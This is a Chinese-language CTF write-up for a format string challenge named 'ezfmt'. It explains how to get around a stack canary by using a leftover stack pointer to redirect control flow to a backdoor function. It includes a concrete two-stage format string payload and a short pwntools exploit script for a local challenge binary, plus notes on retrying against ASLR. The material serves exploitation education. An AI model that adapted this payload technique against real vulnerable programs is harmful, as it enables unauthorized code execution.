# ezfmt

## 题目简述

程序存在格式化字符串漏洞，但开启了 Canary，且无法直接泄露稳定的栈地址。可利用栈上残留的指针作为间接写入目标：先用单字节写修改残留指针的低位，再通过该指针把控制流目标改成后门函数。受地址随机化影响，目标低半字节需要以约 $1/16$ 的概率尝试。

## 解题过程

官方题解使用的后门地址是 `0x40123d`，其十进制值为 `4198973`。载荷分成两次格式化写：

- `%88c%18$hhn` 先累计输出 88 个字符，把第 18 个参数指向位置的低字节改为 `0x58`；
- `%4198885c%22$ln` 再累计输出 `4198885` 个字符，使总计数达到 `88 + 4198885 = 4198973 = 0x40123d`，然后经第 22 个参数执行长整数写入。

对应的最小脚本为：

```python
from pwn import context, process

context.log_level = "debug"
context.arch = "amd64"

io = process("./try1")
backdoor = 0x40123D

payload = b"%88c%18$hhn%4198885c%22$ln"
assert 88 + 4_198_885 == backdoor

io.recvline()
io.sendline(payload)
io.interactive()
```

由于栈地址的低位仍受随机化影响，远程利用时需要在连接失败后重新连接并重复发送，而不是在同一崩溃进程中继续尝试。成功时，残留指针会落到预期栈槽，第二次写入把返回目标改为后门地址。

## 方法总结

- 核心技巧：利用栈上残留指针完成两级格式化字符串任意写，先改指针低字节，再写控制流目标。
- 识别信号：无法直接泄露栈地址，但可控格式串参数中存在指向栈的残留地址，并且 PIE 未开启或后门地址固定。
- 复用要点：`%hhn`、`%hn`、`%n` 写入的是累计输出字符数；多段写入必须精确计算前一段已经产生的计数，并把 ASLR 带来的低位不确定性纳入重连重试逻辑。
